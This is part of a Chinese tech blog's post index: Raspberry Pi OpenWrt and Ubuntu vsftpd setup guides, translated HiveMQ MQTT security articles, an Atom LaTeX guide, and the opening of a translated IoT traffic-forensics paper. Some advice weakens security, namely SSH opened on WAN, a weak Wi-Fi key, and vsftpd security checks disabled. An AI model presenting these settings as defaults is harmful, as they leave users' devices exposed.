&apos;openwrt-fzy&apos; option encryption &apos;psk2&apos; option key &apos;12345678&apos; 配置允许通过wan连接ssh，修改/etc/config/firewall文件： 123456#open ssh on wan interfaceconfig rule option src wan option dest_port 22 option target ACCEPT option proto 重启Raspberry Pi，网线连接路由器dhcp获取ip，笔记本用wifi连接Raspberry Pi。 安装luci界面，可以通过浏览器访问路由。 1234opkg updateopkg install luci/etc/init.d/uhttpd start/etc/init.d/uhttpd enable 配置完成后可通过连接到该无线网络的设备访问192.168.3.1进入到路由器的Web配置界面。 至此，Raspberry Pi作为路由器部分已经完成，后续还可以将其配置成Wi-Fi抓包器。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,OpenWrt］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：TLS/SSL]]></title>
    <url>%2F2017%2F10%2F10%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9ATLS-SSL%2F</url>
    <content type="text"><![CDATA[欢迎来到MQTT安全基础系列的第五部分。在最近几周的文章中关注了应用层的身份验证和授权后，本周的主题是使用TLS的传输加密。 我们将看看为什么TLS / SSL对于安全的MQTT解决方案是有利的，我们将讨论使用MQTT传输加密时的最佳做法。 注：本文翻译自：MQTT Security Fundamentals: TLS / SSL 什么是TLS TLS（传输层安全）和SSL（安全套接字层）在客户端和服务器之间提供安全的通信通道。其核心是TLS和SSL是使用握手机制协商各种参数以在客户端和服务器之间建立安全连接的加密协议。握手完成后，建立客户端与服务器之间的加密通信，没有攻击者可以窃听通信的任何部分。服务器提供X509证书，通常由受信任的机构颁发，客户端用它来验证服务器的身份。 为什么TLS很重要？ 想像你正在发送明信片。很明显，该卡的收件人是谁，邮递员将确保该卡到达。然而，没有什么可以阻止邮递人员读卡的内容，实际上涉及交付明信片的每个人都可以阅读内容。如果你有一个恶意的邮递员，他甚至可以改变明信片中的一些内容！ 以上说明的情况对于一般的计算机网络和特别是互联网也是如此。如果你使用纯TCP/IP，就像发送明信片。 TCP数据包将在达到目标之前经过大量基础架构组件（路由器，防火墙，Internet交换点等）。所有参与者之间现在可以以明文形式读取您的数据包的内容，甚至可以修改它。这不是一个虚构的场景，最近的历史表明，互联网流量一直被情报机构窃听。虽然大多数攻击者没有太多的资源来窃听你的连接，但复杂的攻击者并不是太难以执行“中间人攻击”。 所以TLS就是提供一个安全的通信信道。使用TLS，可以肯定的是，第三方不能读取或更改通信内容*。 假设使用安全的密码套件，并且对所使用的TLS版本没有未知的攻击。 MQTT与TLS MQTT依赖于TCP作为传输协议，这意味着默认情况下连接不使用加密通信。为了加密整个MQTT通信，大多数MQTT代理（如HiveMQ）允许使用TLS而不是纯TCP。如果使用MQTT CONNECT数据包的用户名和密码字段进行身份验证和授权机制，则应强烈考虑使用TLS。 端口8883对于安全的MQTT连接是标准化的。IANA的标准化名称是“secure-mqtt”，端口8883专用于基于TLS的MQTT。 TLS开销 然而，一如以往，在使用基于TLS的MQTT时存在一个缺点：安全性在CPU使用率和通信开销方面是有代价的。虽然代理的附加CPU使用率通常可以忽略不计，但对于非专门针对计算密集型任务而设计的非常受限的设备来说，这可能是一个问题。诸如Session Resumption之类的技术可以大大提高TLS的性能。 如果MQTT客户端连接预期是短暂的，则TLS握手的通信开销可能很大。虽然这取决于许多因素，TLS握手需要多少带宽，但一些测量显示，建立新的TLS连接可能需要高达几千字节的带宽。由于每个数据包在使用TLS时都被加密，与未加密的数据包相比，电线上的数据包也有额外的开销。 因此，如果你使用长存TCP连接与MQTT（你应该！），TLS开销，特别是TLS握手开销可能是微不足道的。如果您正在处理许多重新连接，并且无法使用会话恢复，那么开销可能很大，特别是如果您发布非常小的MQTT消息。如果电线上的每个字节对您的用例计数，则由于开销，TLS可能不是你的最佳选择，因此请务必测量TLS用于你的用例的开销。 会话恢复 我们已经听说过以前段落中的TLS会议恢复。简而言之，TLS会话恢复技术允许在重新连接到服务器之后重用已经协商的TLS会话，因此客户端和服务器不需要再次完成TLS握手。重要的是要注意，并不是所有的TLS库实现了所有会话恢复技术，有些甚至没有实现任何会话恢复机制。 有两个会话恢复机制： Session IDs：服务器将秘密状态与会话ID一起存储。当客户端重新连接时，它提供会话ID，可以恢复会话。 Session Tickets：服务器的秘密状态被发送到客户端，并且仅使用服务器知道的秘密密钥进行加密。重新连接时，客户端将此故障单发送回服务器。如果服务器可以再次对内容进行解密，会话将恢复为机密中包含的状态。 HiveMQ支持Session IDs，但不支持Session Tickets。 受限设备上的TLS 由于资源不足，有时TLS对于受限设备是不可行的。根据使用的密码，TLS可能非常计算密集，可能需要几十千字节的内存。如果您的设备无法使用TLS，则应考虑为PUBLISH消息使用有效负载加密，并且至少应在客户端的CONNECT消息中对密码进行散列或加密。更多关于该主题的下一篇博客文章。 它也可以是查看TLS-PSK密码套件的选项，因为它们避免了CPU密集型公钥操作。TLS-PSK密码尚未被广泛采用，因此您需要重新检查TLS库是否支持此功能。 我应该总是使用TLS与MQTT？ Short answer：是的，如果可以的话。 Long answer：如果您能够负担CPU和带宽的开销，那么安全的通信通道是无价的。如果在客户端和服务器端正确实施TLS，则确保没有窃听者可以拦截您的通信，并获得对应用程序级身份验证和授权很重要的附加安全层。 最佳做法如果可以的话，始终使用TLS 如果您能负担额外的带宽并且您的客户端具有足够的计算能力和TLS内存，那么始终使用TLS与MQTT。根据经验，总是使用加密的通信通道，也可以用于HTTP等其他协议。 使用最高可用的TLS版本 虽然TLS 1.0，TLS 1.1和TLS 1.2在实践中至少不会破坏（至少到现在为止），但您应该始终使用对您的MQTT客户端可行的最高TLS版本。事实上，对TLS 1.0和1.1有着众所周知的攻击，可以缓解这些攻击，有些则针对HTTP漏洞（如CRIME攻击）而设计。在撰写本文时，没有实际适用的攻击TLS 1.2。 不要使用SSLv3 不要使用SSLv3或任何以前的版本。POODLE攻击显示，SSLv3现在必须被视为破损坏。所有其他SSL版本也被认为是破坏的，不应该被使用。 始终验证X509证书链 为了防止中间人攻击，您的MQTT客户端验证来自MQTT代理的X509证书是非常重要的。一些恶意的客户端实现使用“允许全部”方法，通常与自签名服务器证书组合。永远不要这样做！做更多安全和验证证书总是值得的。 使用受信任CA的证书 使用受信任的CA的官方证书值得他们花费的额外费用，因为自签名的证书在许多TLS实现方面不能太好地运行，并且通常会导致例如错误的代码。不验证证书，造成中间人攻击的可能性。如果您的MQTT代理面向公开，则必须具有受信任的证书。如果您通过Websockets使用MQTT，则自签名证书不是最佳的，因为大多数现代Web浏览器不允许使用不受信任的证书进行websocket连接资源。 使用其他安全机制 除了TLS之外，使用额外的安全机制（如有效负载加密，有效载荷签名验证和授权机制）总是一个好主意。更安全的考虑通常不会有伤害。 只使用安全密码套件 使用TLS时可以使用许多不安全的密码套件。确保只允许安全的密码套件进行通信，否则可能会产生错误的安全感，因为有许多已知被破坏的密码套件。 我们希望您喜欢第五部分MQTT安全基础知识。下周我们将与TLS一起讨论X509客户端证书身份验证。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：授权]]></title>
    <url>%2F2017%2F09%2F28%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9A%E6%8E%88%E6%9D%83%2F</url>
    <content type="text"><![CDATA[您好，欢迎来到MQTT安全基础的下一篇文章。本周，我们将专注于一个新课题，并通过MQTT研究授权。这在我们以前讨论过认证后才适合。如果您没有阅读关于身份验证的最后两篇文章（第1部分和第2部分），那么在继续阅读此文章之前，您一定要这样做。 注：本文翻译自：MQTT Security Fundamentals: Authorization 什么是授权？ 授权是指定特定资源的访问权限的功能。这包括策略的定义和实施，它们指定谁可以访问某个资源。因此，以下术语至关重要： 主体或用户：想访问资源 资源，对象或服务：应防止未经授权的访问 政策：指定主体是否可以访问资源 真实世界例证 让我们来看一下身份验证博客文章的旅行示例，并继续执行。我们已经看到，登机时可以使用护照来认证一个人的身份。所以在身份确认后，预订确认书或登机证用于授权/授予访问权限以获得特定的飞机。所以在预订航班后，有关您的人的信息和确切的航班日期，时间和目的地作为飞行的授权。 认证和授权：两个最好的朋友！ 正如我们已经在现实世界中看到的那样，认证和授权是两个非常重要的安全概念。用户或主体的授权在事先没有认证的情况下没有太多价值，从而确认其身份。授权对于限制访问非常重要，只允许符合条件的人员，客户或主体访问某些资源，数据或事物。如果您没有特别关注安全性，您可能不会注意到这些概念无处不在，但如果您退缩并仔细查看，您可以轻松识别它们：登录到您的操作系统并访问文件，登录到网络应用程序，并具有某些权利或使用工作人员徽章访问公司大楼。 如何指定授权策略 最常用的是不同类型的授权，这里是一个快速的概述。如果你想了解更多，网络上有大量的资源可以详细地解释这些类型。 简写 名称 说明 示例 ACL 访问控制列表 ACL将资源与权限列表相关联。权限包括谁可以访问资源（例如文件）以及哪些操作（例如，读取，写入，执行）被允许。 Unix文件权限 RBAC 基于角色的访问控制 RBAC始终将某个资源的权限与角色相关联。角色是用户和资源之间的额外抽象。这使得更容易将用户与角色相关联，以便维护所有用户的权限。 Active Directory, SELinux, PostgreSQL MQTT授权 我们来看看MQTT。 MQTT客户端在连接到代理之后基本上可以做两件事情，它可以发布消息，并且可以订阅主题。所以将其转换为以前所述的定义： 一个MQTT客户端是主题，它需要授权才能做某事 客户可用的主要资源或对象是主题 其他对象将是：Store Last Will and Testament或持久会话 需要保护的主要资源是发布或订阅的能力 没有适当的授权，每个经过身份验证的客户端都可以发布和订阅各种主题。这在封闭系统中是可取的。对于大多数用例，细粒度限制使得很有意义，应该被使用。官方的MQTT 3.1.1规范说明了以下事项： 123“MQTT solutions are often deployed in hostile communication environments. In such cases, implementations will often need to provide mechanisms for: […] Authorization of access to Server resources”“MQTT解决方案通常部署在恶劣的通信环境中。在这种情况下，实现通常需要提供以下机制：[...]访问服务器资源的授权&quot; 为了限制客户端发布或订阅仅被授权的主题，有必要在代理方实现主题权限。这些权限需要在代理运行时配置和调整。主题权限可以如下所示： 允许主题（确切主题或通配符主题） 允许的操作（发布，订阅，两者） 允许服务质量水平（0，1，2，全部） 这种主题权限将允许代理为客户端指定授权策略，并限制其订阅和发布消息的能力。一个例子是给客户端许可只订阅一个主题，只使用一定的服务质量水平。 拒绝 在定义了授权策略之后，一个很常见的问题是如何通知客户它没有发布或订阅某个主题的权限。 发布 当发布到主题时，客户端没有权限，代理有两个选项： 它可以断开客户端，因为发布到受限主题是不允许的。 它可以以普通方式向客户端发送（在使用PUBACK或PUBREL的QoS 1或2的情况下），并决定不向订阅者发送已发布的消息。 目前的MQTT 3.1.1规范没有定义与代理无关的方式来通知客户端未经授权的发布，除了断开客户端，这可能会在即将到来的MQTT版本中有所改进。 订阅 在订阅主题的情况下，代理需要使用返回码确认每个订阅。有4个不同的代码用于确认具有授权QoS的每个主题或发送错误代码。因此，如果客户端无权订阅特定主题，代理可以通知客户该订阅被拒绝。 最佳做法 常用的最佳做法是将许可中的发布客户端的客户端标识包含在内。所以客户端仅限于发布到主题，客户端ID在哪里。一个例子是client123/temperature或client123/＃。同样可以用于订阅。这是一个只关心一个客户端的主题的良好模式。当然，这通常不是唯一的许可。此外，客户端通常具有订阅更常规主题的权限，如：clients/status或clients/command。这很大程度上取决于用例，应该只是一个建议。 代理实现 最后，我们来看看HiveMQ MQTT代理如何实现自定义授权。 HiveMQ的开源插件系统可以轻松为每个客户端指定主题权限。每当客户端想要发布或订阅时，HiveMQ会向插件询问客户端的权限。当然这些权限可以被缓存，所以它不会减慢消息流。 OnAuthorizationCallback允许实现getPermissionsForClient方法，其示例如下所示。该方法从HiveMQ内核中调用，并交付一个ClientData对象，该对象包含可用于客户端请求权限的所有可用信息。这可以用来确定正确的权限，就像示例中使用客户端ID一样。HiveMQ期望插件返回客户端允许使用的主题权限列表。HiveMQ本身完成了权限和当前主题的完全匹配。 123456789101112@Override@Cached(timeToLive = 5, timeUnit = TimeUnit.MINUTES)public List&lt;MqttTopicPermission&gt; getPermissionsForClient(ClientData clientData) &#123; List&lt;MqttTopicPermission&gt; mqttTopicPermissions = new ArrayList&lt;MqttTopicPermission&gt;(); mqttTopicPermissions.add( new MqttTopicPermission( clientData.getClientId() + “/#”, // Topic MqttTopicPermission.ALLOWED_QOS.ALL, // QoS MqttTopicPermission.ALLOWED_ACTIVITY.ALL)); // Publish, Subscribe, All return mqttTopicPermissions;&#125; 该示例显示客户端如何只发布和订阅主题，从其客户端ID开始。所有其他订阅或发布的消息都被拒绝。 完整的示例可以在HiveMQ GitHub帐户中找到。 另一个例子是Stormpath插件，它使用Strompath API进行身份验证和授权。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：高级认证机制]]></title>
    <url>%2F2017%2F09%2F23%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9A%E9%AB%98%E7%BA%A7%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[在上一篇文章中，我们已经解释了认证的基础知识，并且MQTT协议在CONNECT消息中提供用于认证的用户名和密码。此帖子将引入其他机制来验证客户端，以及如何在MQTT代理端上实现身份验证。 注：本文翻译自：MQTT Security Fundamentals: Authentication with Username and Password 使用其他信息认证 正如我们在上一篇文章中了解到的，认证是确认一方的身份的机制。我们已经看到如何通过使用用户名和密码组合来实现。除了用户名和密码外，MQTT客户端还提供可用于认证的附加信息。 客户端标识符 每个MQTT客户端都有唯一的客户端标识符该唯一标识符由客户端在MQTT CONNECT消息中提供。客户端ID最多可达65535个字符，以前限制为23个字符的MQTT 3.1.1规范无效。通常的做法是使用36个字符长的uuids或客户端可用的任何其他唯一信息，如网络模块的MAC地址或设备本身的序列号。在身份验证过程中，除了用户名和密码之外，常常使用客户端ID。确认客户端是否可以访问MQTT代理的常见示例是验证用户名/密码以及该凭证组合的正确客户端ID。虽然这不是一个很好的安全措施，但也可以忽略用户名/密码，并根据客户端标识符进行身份验证。对于封闭系统，这种认证可能就够了。 X.509证书 来自客户端的另一个可能的认证来源是一个X.509客户端证书，它将在TLS握手期间向代理提供（我们将在稍后的一篇文章中解释更多关于传输级安全性以及SSL/TLS如何与MQTT一起工作的方式）。像HiveMQ这样的代理可以在TLS握手已经成功后，使用证书中的信息进行应用层验证。这使得代理能够读取证书中包含的所有信息，并将其用于认证目的。如果您可以控制提供IoT设备，则X509客户端证书可能是对MQTT代理进行身份验证的非常好的来源。 使用HiveMQ实现认证 我们已经看到有可用于MQTT客户端认证的各种信息。现在是时候连接MQTT代理和身份验证存储，它可以是数据库，Web服务，LDAP目录或简单的ACL（访问控制列表）。看看如何在HiveMQ MQTT代理程序中实现认证逻辑。HiveMQ代理有一个开放源码的插件系统，它允许你挂钩在代理上的各种事件。HiveMQ具有不同的回调接口，它们在定制插件中非常容易实现。插件实现在运行时由代理调用。为了认证，HiveMQ提供OnAuthenticationCallback。 123456789public class AuthWithUsernamePasswordCallback implements OnAuthenticationCallback &#123; @Override public Boolean checkCredentials(ClientCredentialsData clientCredentialsData) throws AuthenticationException &#123; // Custom Authentication Logic &#125;&#125; 这种回调实现足以根据您的用例自定义身份验证机制。方法回调有一个参数，它是ClientCredentialsData类型的一个对象，它继承了ClientData类型。这包含HiveMQ从连接客户端可用的所有数据。它允许您检查客户端ID，用户名，密码和证书。如果客户端提供有效的认证信息，则此回调将返回true。为了拒绝认证，有两种可能性： return false throw an Exception 如果回调函数返回false，HiveMQ将看到是否有任何其他插件和请求身份验证。如果其中一个返回true，HiveMQ将接受客户端的身份验证。如果HiveMQ不应该考虑任何其他插件，并立即拒绝连接，则应抛出异常。使用异常时，也可以修改CONNACK返回码。我们有一个更普遍的例子，在GitHub上使用用户名/密码验证的虚拟实现。 在从HiveMQ提取回调之前，需要将其添加到回调注册表中。这可以很容易地在插件的主类中完成。主要的类是每个插件都需要的，可以很容易地识别，因为它是唯一扩展PluginEntryPoint的类。回调通过依赖注入注入并添加到回调注册表中。现在插件可以和HiveMQ代理一起使用。 123456789101112131415161718public class AuthenticationExampleMainClass extends PluginEntryPoint &#123; private final AuthWithUsernamePasswordCallback authWithUsernamePasswordCallback; @Inject public AuthenticationExampleMainClass(final AuthWithUsernamePasswordCallback authWithUsernamePasswordCallbackCallback) &#123; this.authWithUsernamePasswordCallback = authWithUsernamePasswordCallbackCallback; &#125; @PostConstruct public void postConstruct() &#123; CallbackRegistry callbackRegistry = getCallbackRegistry(); callbackRegistry.addCallback(authWithUsernamePasswordCallback); &#125;&#125; 可以使用HiveMQ（开放源代码）插件来验证我们的插件目录中的客户端，如ACL的文件验证插件。 如果您需要有关如何开发，运行和部署HiveMQ代理的自定义验证插件的更多信息，请阅读插件开发人员指南。 这也是MQTT安全基础知识认证部分的结尾。在下一篇文章中，我们将介绍使用MQTT的主题级别授权。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atom Latex编辑器配置]]></title>
    <url>%2F2017%2F09%2F16%2FAtom-Latex%E7%BC%96%E8%BE%91%E5%99%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[将Atom配置成为强大的Latex编辑器。 安装Atom Atom是由GitHub打造更为先进的编辑器，支持Windows、Mac、Linux三大桌面平台，完全免费，并且已经在GitHub上开放了全部的源代码。 Atom高度的可定制性，让用户可以自行添加所需要的功能，打造自己最易用的代码编辑器。与其它主流代码编辑器相比，显得轻巧了许多。 官网下载地址：https://atom.io/ Atom Github地址：https://github.com/atom/atom 如果使用官网的Installer安装失败，可直接到Github下载压缩包，直接解压使用，无需安装。 下载地址：https://github.com/atom/atom/releases/tag/v1.20.0 安装texlive TeX Live是一个TeX发行版，它是一组程序的集合，主要作用就是将你写的TeX代码进行解析排版输出成PS或者pdf。“TeX发行版相对于TeX语言”大致可以理解为“C语言编译器(如GCC或Clang)相对于C语言”的关系； 下载地址：http://tug.org/texlive/acquire-netinstall.html 记住安装地址，后续需要用到！ 安装Latex编译插件 打开Atom，File -&gt; Settings -&gt; Install，搜索并安装Latex插件，然后配置插件。 配置Tex Path为texlive的安装路径，Engine为pdflatex，其他的默认即可，如下图： 注意： 我们可能会遇到与Atom官网连接故障的问题导致Atom插件安装失败，可采用手动安装的方式，在Atom中搜索到相关package，点击插件名到Atom Packages页面。 然后到该插件的Github仓库，使用git将其克隆到atom的packages文件夹，或者使用下载zip文件并解压的方式，最后用npm命令安装。 Windows下.atom文件夹在C盘Users对应的你的用户名的目录下。 注：需提前安装nodejs，安装node以后自动会安装npm，使用Git命令行工具进行下载，然后使用npm进行安装。 1234cd ~/.atom/packagesgit clone https://github.com/thomasjo/atom-latex.gitcd latexnpm install 然后重启Atom即可看到该插件已经成功安装。 安装语言高亮插件 搜索并安装language-latex插件，该插件还可以实现LaTeX命令的自动补全功能，具体使用方案请自行搜索。 安装PDF预览插件 搜索并安装pdf-view插件，安装以后，Latex编译后会调用此插件进行pdf预览。 编译预览 新建latex文件，后缀为tex，然后填写如下内容： 123456789101112131415161718\documentclass[UTF8]&#123;article&#125;\author &#123;Zhenyu Fan&#125;\title &#123;My First Latex document&#125;\usepackage&#123;ctex&#125;\usepackage&#123;amsmath&#125;\usepackage&#123;amssymb&#125;\begin&#123;document&#125;\maketitle\section&#123;First section&#125; \subsection&#123;First subsection&#125; \subsubsection&#123;First double subsection&#125; \paragraph&#123;Fist paragraph&#125; \subsection&#123;Second subsection&#125;心之所向，素履以往。\end&#123;document&#125; 点击Atom菜单栏Packages -&gt; Latex -&gt; Builde（快捷键Ctrl+Alt+B）进行编译，然后就可以看到右侧生成的pdf文件，修改之后只要再次编译就可以查看到修改之后的预览效果。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Latex</tag>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu中ftp服务器安装与配置]]></title>
    <url>%2F2017%2F09%2F14%2FUbuntu%E4%B8%ADftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[最近需要用到ftp，所以在腾讯云服务器上搭建了一个ftp服务器，简单记录一下Ubuntu Server中ftp服务器的初步配置。 ftp服务器安装用apt-get工具安装vsftpd1$ sudo apt-get install vsftpd 检查FTP端口是否已经打开ftp默认情况下，命令端口是21，数据端口就是20 1$ netstat -tnl 或者直接在浏览器里输入“ftp://服务器IP” 启动vsftpd服务123$ service vsftpd start或$ /etc/init.d/vsftpd start 停止vsftpd服务123$ service vsftpd stop或$ /etc/init.d/vsftpd stop 重启vsftpd服务123$ service vsftpd restart或$ /etc/init.d/vsftpd restart 查看服务状态1$ sudo service vsftpd status ftp服务器配置配置文件 主配置文件：/etc/vsftp.conf 权限限制用户列表文件：/etc/vsftp.chroot_list 认证配置文件：/etc/pam.d/vsftpd 主配置文件 修改主配置文件 1$ sudo nano /etc/vsftpd.conf 123anonymous_enable=NO（是否允许匿名登陆）local_enable=YES（是否允许本地登陆）write_enable=YES（设置FTP可写） chroot：change root directory chroot_local_user： 是否将所有用户限制在主目录,YES为启用 NO禁用.(该项默认值是NO,即在安装vsftpd后不做配置的话，ftp用户是可以向上切换到要目录之外的) chroot_list_enable： 是否启动限制用户的名单 YES为启用 NO禁用(包括注释掉也为禁用) chroot_list_file=/etc/vsftpd/chroot_list： 是否限制在主目录下的用户名单，至于是限制名单还是排除名单，这取决于chroot_local_user的值。文件默认是并不存在，需要手动创建. 123chroot_local_user=YESchroot_list_enable=YESchroot_list_file=/etc/vsftpd.chroot_list 我是用的是全局禁止跳出主目录，使用chroot_list添加例外！即，chroot_local_user=YES，chroot_list_enable=YES 1pam_service_name=vsftpd（这里有可能会出现530的错误，导致ftp用户无法登录，与后面的认证配置文件有关） 530错误： 权限限制用户列表 修改权限限制用户列表文件 1$ sudo nano /etc/vsftpd.chroot_list 具体作用与chroot_local_user和chroot_list_enable的配置有关，参考上面的表格进行相应的添加或删除，一行对应一个用户。 认证配置文件 修改可访问用户列表文件， 1$ sudo nano /etc/vsftpd.chroot_list 12345678910# Standard behaviour for ftpd(8).auth required pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.# Standard pam includes@include common-account@include common-session@include common-auth#auth required pam_shells.so 在这里，注释掉最后一行可以避免530错误。 用户管理添加ftp用户 创建用户 1$ sudo useradd username Linux的useradd命令如下： 1useradd(选项)(参数) 选项参数如下： 12345678910111213-c&lt;备注&gt;：加上备注文字。备注文字会保存在passwd的备注栏位中；-d&lt;登入目录&gt;：指定用户登入时的启始目录-D：变更预设值；-e&lt;有效期限&gt;：指定帐号的有效期限；-f&lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号；-g&lt;群组&gt;：指定用户所属的群组；-G&lt;群组&gt;：指定用户所属的附加群组；-m：自动建立用户的登入目录；-M：不要自动建立用户的登入目录；-n：取消建立以用户名称为名的群组；-r：建立系统帐号；-s：指定用户登入后所使用的shell；-u：指定用户id。 设置用户口令 1$ sudo passwd username 然后输入两次密码即可。 删除ftp用户1$ sudo userdel username 卸载vsftpd1$ sudo apt-get remove --purge vsftpd –purge 选项表示彻底删除改软件和相关文件 无权限错误 使用cmd的ftp可以正常登录，但是使用windows的文件管理器登录到ftp服务器时报错的问题： 在主配置文件中添加： 1pasv_promiscuous=YES 此选项激活将关闭pasv的安全检查，关于ftp的port模式和pasv模式将在以后的博客中介绍。 500 OOPS错误 500 OOPS: vsftpd: refusing to run with writable root inside 在主配置文件中添加： 1allow_writeable_chroot=YES]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Traffic Forensics for IPv6-Based Wireless Sensor Networks and the Internet of Things]]></title>
    <url>%2F2017%2F08%2F28%2F%E8%AF%91-Traffic-Forensics-for-IPv6-Based-Wireless-Sensor-Networks-and-the-Internet-of-Things%2F</url>
    <content type="text"><![CDATA[Traffic Forensics for IPv6-Based Wireless Sensor Networks and the Internet of Things（全文翻译） 123Vijay Kumar, George Oikonomou, and Theo TryfonasFaculty of Engineering, University of Bristol, Bristol, UKEmail: vk12122@my.bristol.ac.uk; &#123; g.oikonomou; theo.tryfonas &#125; @ bristol.ac.uk 摘要：无线传感器网络（WSN）和物联网（IoT）领域的研究和标准化工作正在引导采用TCP / IP来部署严格受限的智能嵌入式对象网络。因此，无线传感器现在可以通过IPv6地址进行唯一标识，从而直接连接到互联网并可从互联网访问。这具有一系列优点，但也暴露了传感器部署到新的安全漏洞。如果部署受到影响，事件后分析可以通过在攻击之前，之中和之后的时间段内检查网络的状态和流量来提供有关攻击性质的信息。在本文中，我们采用流量法证技术，以实现对基于IPv6的低功耗无线个域网中可用性的攻击的后检测。为此，我们首先实施利用低功耗和有损网络（RPL）的IPv6路由协议的固有漏洞的攻击。随后，我们提出了一种通过检查网络数据包捕获来检测和分析此攻击的自动化方法。 关键词：6LoWPAN取证，交通取证，无线传感器网络 引言 针对嵌入式设备的符合标准的TCP/IP协议栈的开发一直是物联网应用开发的关键推动因素。电气和电子工程师协会（IEEE）的802.15.4低功耗无线通信标准是无线传感器网络部署的关键组成部分。 IPv6低功耗无线个人区域网络（6LoWPAN）[1]和相关互联网工程任务组（IETF）规范[2]，[3]已经使得在网络嵌入式智能对象网络中使用IPv6成为可能。对于这些网络，RPL [4]是路由的事实标准。 采用TCP/IP系列协议使WSN容易受到新的安全威胁。例如，Internet控制消息协议版本6（ICMPv6）用于在IPv6网络中执行关键功能，其中之一是邻居发现（ND）。 IPv6 ND的安全漏洞以前已被记录[5]，[6]，而6LoWPAN安全威胁和对策的详细概述则在[7]中提出。 此外，低功耗和有损网络的IPv6路由协议（RPL）本身也具有研究和标准化社区讨论的漏洞：易受选择性转发，虫洞和漏洞攻击[8] - [11]导致数据完整性，可用性和机密性的丢失。 RPL规范定义了一些旨在实现保密性，完整性和重放保护的安全对策[4]。学术界也提供了可能的解决方案，如VeRA [8]。然而，这些机制尚未广泛采用。例如，用于IoT的Contiki开源操作系统中的RPL实现不支持任何操作系统。可能的原因之一是RPL的复杂性和可实现性的问题，其中一些已经被记录在案[12]。另外，一些RPL的安全服务依赖于高级加密标准（AES）。由于节点形成6LoWPAN的处理限制，关键协商和协议尚未成熟。最近的研究已经证明了基于椭圆曲线的方法的可行性[13]。 在事件发生的情况下，事后分析可以提供关于攻击性质的信息以及用于实施攻击的机制。 Contiki嵌入式物联网操作系统（IoT）为上述几个标准和规范提供了成熟的支持，这是一个非常适合这一领域研究的平台。 在这方面，本文的贡献如下： 我们实施和展示了攻击RPL的可行性。在这样做的同时，我们提出了IPv6连接的无线传感器网络的法医准备的必要性。 使用这种攻击作为用例，我们提供一种通过检查6LoWPAN流量捕获来进行事后检测和分析的自动化方法。 相关工作 以前关于WSN流量取证分析的工作主要依赖于形成WSN部署的强大的观察者节点。例如，已经提出了一个调查员节点网络作为数字化虫洞攻击的解决方案[14]。这些观察者负责捕获传感器节点行为并将该信息转发到网络的基站。同样的工作提出了一套分析证据的算法，以便识别协作恶意节点并重建虫洞攻击情景。 以类似的方式，已经证明，可以通过增加强大的取证节点，在预先部署的IEEE 802.15.4 WSN [15]上添加数字取证准备层。它们捕获所有WSN数据平面流量并保持帧的真实性和完整性。这项工作主要集中在减少执行数字调查所涉及的时间和成本，并展示了对现有网络进行任何修改而收集证据的能力。 具有分析流量和检测攻击能力的强大观察员节点已被[16]中记录的工作采用。观察者可以检测各种模式，如蠕虫孔，黑洞，沉孔和sybil攻击。只有非法行为被转发到网络的基站，从而减少通信开销。 在没有观察者的不同方法中，已经提出了一种远程现场取证保护框架，旨在防止在传感器设备上执行非法软件[17]。节点能够在被篡改的时候通知对方的入侵。该框架使用沙盒将正在运行的应用程序的内存访问限制在合法的内存空间内。它还提出了旨在通过验证软件真实性来防止恶意代码执行的技术。 Foren6是最近针对6LoWPAN提供诊断和调试能力的研究工作[18]。它是一种被动监测工具，可以从多个潜在的移动嗅探器收集信息。Foren6存储网络状态和拓扑变化的历史记录，称为版本，并提供通过网络显示器以事后方式浏览整个历史记录的能力。其目前的版本主要集中在网络调试和诊断上，但缺少自动化事件检测。 SVELTE[11]是采用混合集中分布式方式的6LoWPAN/RPL网络的IDS。集中式组件在网络边界路由器上执行，并使用三个模块。分布式组件在所有网络节点上运行，并且还使用补充集中组件的三个模块。 已经表明，可以采用压缩感测技术来窃听加密的无线传输，检测流量的周期性组件，并最终揭示部署在网络中的应用程序的类型[19]。在这项工作中，作者正在讨论攻击者的一方，但是可以采用类似的原则来进行取证目的的流量分析。 IETF目前正在RPL网络中进行入侵检测和防御领域的标准化工作。最近出版的互联网草案提出了可应用于RPL部署的入侵检测系统（IDS）架构的整理[20]。该文件在RPL网络的上下文中依次讨论数据源位置，收集频率和入侵响应。这项工作仍处于初期阶段。 RPL版本和rank利用 RPL是距离矢量路由协议，并将网络感知为称为面向目的节点的有向无环图（DODAG）的树状结构。数据流量通常从网络成员向DODAG根（向上）流动。数据也可以从靠近根部的节点向远离节点的路径向下移动。根据RFC，对这种类型的数据流的支持是可选的。 RPL控制平面数据包在ICMPv6数据报中传输。 